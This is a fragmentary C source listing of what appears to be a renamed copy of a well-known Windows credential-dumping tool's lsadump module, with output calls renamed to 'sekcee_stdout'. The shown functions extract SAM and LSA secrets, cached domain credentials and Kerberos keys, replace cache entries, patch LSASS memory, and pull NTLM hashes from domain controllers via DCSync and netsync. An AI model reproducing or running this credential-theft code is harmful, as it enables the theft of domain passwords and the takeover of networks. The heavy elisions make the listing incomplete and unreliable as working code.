...
NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsOrCache)
{
	...
	if(!secretsOrCache)
	{
		...
		{
			sekcee_stdout(L"> User cache replace mode !\n");
			sekcee_stdout(L"  * user     : %s\n", cacheData.username);
			...
			if(!hashStatus)
			{
				kull_m_string_args_byName(argc, argv, L"password", &szPassword, SEKCEE);
				sekcee_stdout(L"  * password : %s\n", szPassword);
				RtlInitUnicodeString(&uPassword, szPassword);
				hashStatus = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
			}
			if(hashStatus)
			{
				sekcee_stdout(L"  * ntlm     : ");
...
BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm)
{
	...
	sekcee_stdout(L"%s : ", isNtlm ? L"NTLM" : L"LM  ");
	if(pSamHash->offset)
	{
...
BOOL kuhl_m_lsadump_getLsaKeyAndSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hSecurityBase, IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN LPBYTE sysKey, IN BOOL secretsOrCache, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
{
	...
	if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Policy", 0, KEY_READ, &hPolicy))
	{
		...
		if(kull_m_registry_OpenAndQueryWithAlloc(hSecurity, hPolicy, L"PolDnDDN", NULL, NULL, &buffer, NULL))
		{
			...
			uString.MaximumLength = ((PUSHORT) buffer)[1];
			uString.Buffer = (PWSTR) ((PBYTE) buffer + *(PDWORD) ((PBYTE) buffer + 2*sizeof(USHORT)));
			sekcee_stdout(L"Domain FQDN : %wZ\n", &uString);
			LocalFree(buffer);
		}
				...
				if(pPolRevision->Minor > 9) // NT 6
				{
					if(kuhl_m_lsadump_sec_aes256((PNT6_HARD_SECRET) buffer, szNeeded, NULL, sysKey))
					{
						if(nt6keysStream = (PNT6_SYSTEM_KEYS) LocalAlloc(LPTR, ((PNT6_HARD_SECRET) buffer)->clearSecret.SecretSize))
						{
							...
							sekcee_stdout(L"LSA Key(s) : %u, default ", nt6keysStream->nbKeys); kull_m_string_displayGUID(&nt6keysStream->CurrentKeyID); sekcee_stdout(L"\n");
							for(i = 0, offset = 0; i < nt6keysStream->nbKeys; i++, offset += FIELD_OFFSET(NT6_SYSTEM_KEY, Key) + nt6key->KeySize)
							{
								...
								sekcee_stdout(L"  [%02u] ", i); kull_m_string_displayGUID(&nt6key->KeyId); sekcee_stdout(L" "); kull_m_string_wprintf_hex(nt6key->Key, nt6key->KeySize, 0); sekcee_stdout(L"\n");
							}
						}
					}
				}
		...
		if(kull_m_registry_RegOpenKeyEx(hSecurity, hSecurityBase, L"Cache", 0, KEY_READ | (pCacheData ? (pCacheData->username ? KEY_WRITE : 0) : 0), &hCache))
		{
			if(lsaKeysStream)
			{
				...
				if(kull_m_registry_RegQueryValueEx(hSecurity, hCache, L"NL$IterationCount", NULL, NULL, (LPBYTE) &i, &szNeeded))
				{
					...
					sekcee_stdout(L"* NL$IterationCount is %u, %u real iteration(s)\n", i, iter);
					if(!i)
						sekcee_stdout(L"* DCC1 mode !\n");
				}
				else sekcee_stdout(L"* Iteration is set to default (10240)\n");
			}
							...
							if(kull_m_registry_RegEnumValue(hSecurity, hCache, i, secretName, &szSecretName, NULL, &type, (LPBYTE) pMsCacheEntry, &szSecret))
							{
								...
								if(lsaKeysStream) // NT 6
								{
									if(kull_m_crypto_aesCTSEncryptDecrypt(CALG_AES_128, pMsCacheEntry->enc_data, s1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->iv, FALSE))
									{
										...
										{
											sekcee_stdout(L"> User cache replace mode (2)!\n");
											if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter)))
											{
												sekcee_stdout(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); sekcee_stdout(L"\n");
												if(kull_m_crypto_hmac(CALG_SHA1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
												{
													sekcee_stdout(L"  Checksum  : "); kull_m_string_wprintf_hex(pMsCacheEntry->cksum, MD5_DIGEST_LENGTH, 0); sekcee_stdout(L"\n");
								...
								else // NT 5
								{
									if(kull_m_crypto_hmac(CALG_MD5, pNLKM, szNLKM, pMsCacheEntry->iv, LAZY_IV_SIZE, key.Buffer, MD5_DIGEST_LENGTH))
									{
										...
										if(NT_SUCCESS(nStatus))
										{
											...
											if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
											{
												sekcee_stdout(L"> User cache replace mode (1)!\n");
												if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0)))
												{
													sekcee_stdout(L"  MsCacheV1 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); sekcee_stdout(L"\n");
...
void kuhl_m_lsadump_printMsCache(PMSCACHE_ENTRY entry, CHAR version)
{
	...
	sekcee_stdout(L"MsCacheV%c : ", version); kull_m_string_wprintf_hex(((PMSCACHE_DATA) entry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); sekcee_stdout(L"\n");
}
...
void kuhl_m_lsadump_getInfosFromServiceName(IN PKULL_M_REGISTRY_HANDLE hSystem, IN HKEY hSystemBase, IN PCWSTR serviceName)
{
	...
	{
		sekcee_stdout(L" / service \'%s\' with username : %.*s", serviceName, szNeeded / sizeof(wchar_t), objectName);
...
NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
{
	...
	{
		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), SEKCEE_NT_BUILD_NUMBER))
		{
		...
		if(NT_SUCCESS(LsaOpenPolicy(NULL, &objectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy)))
		{
			if(NT_SUCCESS(LsaQueryInformationPolicy(hPolicy, PolicyAccountDomainInformation, (PVOID *) &pPolicyDomainInfo)))
			{
				...
				if(NT_SUCCESS(status))
				{
					...
					if(NT_SUCCESS(status))
					{
						sekcee_stdout(L"Domain : %wZ / ", &pPolicyDomainInfo->DomainName);
...
PKERB_KEY_DATA kuhl_m_lsadump_lsa_keyDataInfo(PVOID base, PKERB_KEY_DATA keys, USHORT Count, PCWSTR title)
{
	...
	if(Count)
	{
		...
		for(i = 0; i < Count; i++)
		{
			sekcee_stdout(L"      %s : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType));
...
PKERB_KEY_DATA_NEW kuhl_m_lsadump_lsa_keyDataNewInfo(PVOID base, PKERB_KEY_DATA_NEW keys, USHORT Count, PCWSTR title)
{
	...
	if(Count)
	{
		...
		for(i = 0; i < Count; i++)
		{
			sekcee_stdout(L"      %s (%u) : ", kuhl_m_kerberos_ticket_etype(keys[i].KeyType), keys->IterationCount);
			kull_m_string_wprintf_hex((PBYTE) base + keys[i].KeyOffset, keys[i].KeyLength, 0);
			sekcee_stdout(L"\n");
		}
	}
...
void kuhl_m_lsadump_trust_authinformation(PLSA_AUTH_INFORMATION info, DWORD count, PNTDS_LSA_AUTH_INFORMATION infoNtds, PCWSTR prefix, PCUNICODE_STRING from, PCUNICODE_STRING dest)
{
	...
	sekcee_stdout(L" [%s] %wZ -> %wZ\n", prefix, from, dest);
	if(info)
	{
		for(i = 0; i < count; i++)
		{
			sekcee_stdout(L"    * "); kull_m_string_displayLocalFileTime((PFILETIME) &info[i].LastUpdateTime);
			sekcee_stdout((info[i].AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? L" - %s - " : L"- %u - ", (info[i].AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? TRUST_AUTH_TYPE[info[i].AuthType] : L"unknown?");
			kull_m_string_wprintf_hex(info[i].AuthInfo, info[i].AuthInfoLength, 1); sekcee_stdout(L"\n");
	...
	{
		sekcee_stdout(L"    * "); kull_m_string_displayLocalFileTime((PFILETIME) &infoNtds->LastUpdateTime);
		sekcee_stdout((infoNtds->AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? L" - %s - " : L"- %u - ", (infoNtds->AuthType < ARRAYSIZE(TRUST_AUTH_TYPE)) ? TRUST_AUTH_TYPE[infoNtds->AuthType] : L"unknown?");
		kull_m_string_wprintf_hex(infoNtds->AuthInfo, infoNtds->AuthInfoLength, 1); sekcee_stdout(L"\n");
...
NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
{
	...
	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
	{
		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), SEKCEE_NT_BUILD_NUMBER))
		{
			...
			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (SEKCEE_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
				{
	...
	else
	{
		if(NT_SUCCESS(LsaOpenPolicy(szSystem ? &uSystem : NULL, &oaLsa, POLICY_VIEW_LOCAL_INFORMATION, &hLSA)))
		{
			...
			if(NT_SUCCESS(status))
			{
				...
				if(pDomainInfo->Sid)
					sekcee_stdout(L" / "); kull_m_string_displaySID(pDomainInfo->Sid);
				sekcee_stdout(L")\n");
					...
					)
				{
					for(i = 0; i < returned; i++)
					{
						...
						if(domainInfoEx[i].Sid)
							sekcee_stdout(L" / "); kull_m_string_displaySID(domainInfoEx[i].Sid);
						sekcee_stdout(L")\n");
...
void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PKIWI_BACKUP_KEY secret, DWORD size, BOOL isExport)
{
	...
	if(NT_SUCCESS(RtlStringFromGUID(guid, &uString)))
	{
		...
		case 1:
			...
			break;
		default:
			sekcee_stdout(L"  * Unknown key (seen as %08x)\n", secret->version);
...
NTSTATUS kuhl_m_lsadump_bkey(int argc, wchar_t * argv[])
{
	...
	if(szGuid)
	{
		...
		if(NT_SUCCESS(status))
		{
			sekcee_stdout(L"\n"); kull_m_string_displayGUID(&guid); sekcee_stdout(L" seems to be a valid GUID\n");
	...
	else
	{
		...
		if(NT_SUCCESS(status))
		{
			kull_m_string_displayGUID((LPCGUID) secret.Buffer); sekcee_stdout(L"\n");
...
NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
{
	...
	{
		sekcee_stdout(L"[DC] \'%s\' will be the domain\n", szDomain);
		...
		if(szDc)
		{
			sekcee_stdout(L"[DC] \'%s\' will be the DC server\n", szDc);
			if(kull_m_string_args_byName(argc, argv, L"guid", &szGuid, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
			{
				if(szGuid)
					sekcee_stdout(L"[DC] Object with GUID \'%s\'\n", szGuid);
				else
					sekcee_stdout(L"[DC] \'%s\' will be the user account\n", szUser);
				...
				if(kull_m_rpc_createBinding(L"ncacn_ip_tcp", szDc, NULL, L"ldap", RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
				{
					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
					{
						if(DrsExtensionsInt.dwReplEpoch)
							sekcee_stdout(L"[DC] ms-DS-ReplicationEpoch is: %u\n", DrsExtensionsInt.dwReplEpoch);
...
void kuhl_m_lsadump_dcsync_findPrintMonoAttr(LPCWSTR prefix, ATTRBLOCK *attributes, ATTRTYP type, BOOL newLine)
{
	...
	if(kuhl_m_lsadump_dcsync_findMonoAttr(attributes, type, &ptr, &sz))
		sekcee_stdout(L"%s%.*s%s", prefix ? prefix : L"", sz / sizeof(wchar_t), (PWSTR) ptr, newLine ? L"\n" : L"");
}
...
BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
	...
	for(i = 0; i < encodedDataSize; i+= LM_NTLM_HASH_LENGTH)
	{
		...
		{
			if(isHistory)
				sekcee_stdout(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
			else
				sekcee_stdout(L"  Hash %s: ", prefix);
...
void kuhl_m_lsadump_dcsync_descrUser(ATTRBLOCK *attributes)
{
	...
	{
		sekcee_stdout(L"Password last change : ");
		kull_m_string_displayLocalFileTime((LPFILETIME) data);
		sekcee_stdout(L"\n");
	}
...
void kuhl_m_lsadump_dcsync_descrTrust(ATTRBLOCK *attributes, LPCWSTR szSrcDomain)
{
	...
	sekcee_stdout(L"** TRUSTED DOMAIN - Antisocial **\n\n");
...
NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
{
	...
	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			...
			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, SEKCEE);
			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNtlm, NULL))
			{
				if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
				{
					//sekcee_stdout(L"> ClientChallenge          : "); kull_m_string_wprintf_hex(ClientChallenge.data, sizeof(ClientChallenge.data), 0); sekcee_stdout(L"\n");
					status = I_NetServerReqChallenge((LOGONSRV_HANDLE) szDc, (wchar_t *) szComputer, &ClientChallenge, &ServerChallenge);
					if(NT_SUCCESS(status))
					{
						//sekcee_stdout(L"< ServerChallenge          : "); kull_m_string_wprintf_hex(ServerChallenge.data, sizeof(ServerChallenge.data), 0); sekcee_stdout(L"\n");
						MD5Init(&ctx);
						...
						{
							//sekcee_stdout(L"> Session Key              : "); kull_m_string_wprintf_hex(sessionKey, sizeof(sessionKey), 0); sekcee_stdout(L"\n");
							...
							//sekcee_stdout(L"> ClientCredential         : "); kull_m_string_wprintf_hex(ClientCredential.data, sizeof(ClientCredential.data), 0); sekcee_stdout(L"\n");
							//sekcee_stdout(L"> CandidateServerCredential: "); kull_m_string_wprintf_hex(CandidateServerCredential.data, sizeof(CandidateServerCredential.data), 0); sekcee_stdout(L"\n");
							//sekcee_stdout(L"> NegotiateFlags           : 0x%08x\n", NegotiateFlags);
							...
							if(NT_SUCCESS(status))
							{
								//sekcee_stdout(L"< ServerCredential         : "); kull_m_string_wprintf_hex(ServerCredential.data, sizeof(ServerCredential.data), 0); sekcee_stdout(L"\n");
								if(RtlEqualMemory(CandidateServerCredential.data, ServerCredential.data, sizeof(CandidateServerCredential.data)))
								{
									...
									for(status = STATUS_NO_SUCH_USER, i = 0; (status == STATUS_NO_SUCH_USER) && (i < ARRAYSIZE(kuhl_m_lsadump_netsync_sc)); i++)
									{
										...
										//sekcee_stdout(L"> ClientAuthenticator (%u)  : ", kuhl_m_lsadump_netsync_sc[i]); kull_m_string_wprintf_hex(ClientAuthenticator.Credential.data, sizeof(ClientAuthenticator.Credential.data), 0); sekcee_stdout(L" (%u - 0x%08x)\n", ClientAuthenticator.Timestamp, ClientAuthenticator.Timestamp);
										...
										if(NT_SUCCESS(status))
										{
											...
											sekcee_stdout(L"  NTLM   : "); kull_m_string_wprintf_hex(&NewOwfPassword, LM_NTLM_HASH_LENGTH, 0); sekcee_stdout(L"\n");
											sekcee_stdout(L"  NTLM-1 : "); kull_m_string_wprintf_hex(&OldOwfPassword, LM_NTLM_HASH_LENGTH, 0); sekcee_stdout(L"\n");
										}
